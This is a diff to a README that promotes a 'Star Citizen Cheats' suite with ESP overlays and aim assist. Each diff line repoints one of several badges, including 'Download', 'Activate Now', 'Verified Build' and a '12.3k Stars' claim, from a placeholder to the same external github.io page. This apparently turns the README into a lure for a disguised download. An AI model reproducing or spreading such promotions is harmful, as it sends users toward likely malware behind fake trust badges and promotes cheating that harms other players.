@@ -23,10 +23,10 @@ This is more than a basic trainer. It’s a **multi-module cheat suite** for shi
 
 ---
 
-[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](#)
-[![⭐️ 12.3k Stars](https://img.shields.io/badge/GitHub-12.3k_Stars-green?logo=github\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](#)
+[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](https://star-citizen-cheats.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](https://star-citizen-cheats.github.io/.github/)
+[![⭐️ 12.3k Stars](https://img.shields.io/badge/GitHub-12.3k_Stars-green?logo=github\&style=for-the-badge)](https://star-citizen-cheats.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](https://star-citizen-cheats.github.io/.github/)
 
 ---
 
@@ -160,7 +160,7 @@ A: It lowers risk but no cheat is 100% undetectable.
 
 The **Star Citizen Cheats** suite blends **ESP overlays, aim assist, and mining awareness** into one adaptive package. Whether you’re raiding, trading, or mining, it keeps you aware and precise across the ‘verse.
 
-[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](#)
-[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](#)
+[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](https://star-citizen-cheats.github.io/.github/)
+[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](https://star-citizen-cheats.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](https://star-citizen-cheats.github.io/.github/)
 
